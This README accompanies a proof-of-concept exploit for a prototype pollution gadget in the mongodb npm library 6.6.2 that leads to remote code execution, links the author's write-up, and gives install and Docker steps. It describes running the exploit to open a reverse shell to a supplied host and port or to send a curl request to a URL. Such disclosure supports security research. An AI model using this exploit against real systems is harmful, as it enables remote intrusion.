# Prototype pollution gadget in mongodb@6.6.2

This repository contains PoC exploit for prototype pollution gadget I found in mongodb NPM library version 6.6.2. For details about the discovery and exploitation of this vulnerability as well as the solution I implemented, check out this [blog post](https://medium.com/@vuusale/brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e) about it. 

The exploit takes 1 or 2 arguments; IP and port for reverse shell, or a URL for making an HTTP request. A small change I made to the exploit is adding "-d" after URL. That's because "--idleShutdownTimeoutSecs 60" string is automatically appended to the command by the library, which causes unknown option error in curl. "-d" option turns it into the request's body, resulting in a POST request being made to the supplied URL. 

## Setup steps

1. Install nodejs and npm: `sudo apt-get install nodejs npm`
2. Install required dependencies: `npm install mongodb mongodb-client-encryption`
3. Run the exploit: `node poc.js <LHOST> <LPORT>` or `node poc.js <URL>`

## Docker installation

1. Pull the image: `docker pull vuusale/proto-gadget-mongodb`
2. Run the image: `docker run -it vuusale/proto-gadget-mongodb`
3. Run the exploit: `node poc/poc.js <LHOST> <LPORT>` or `node poc/poc.js <URL>`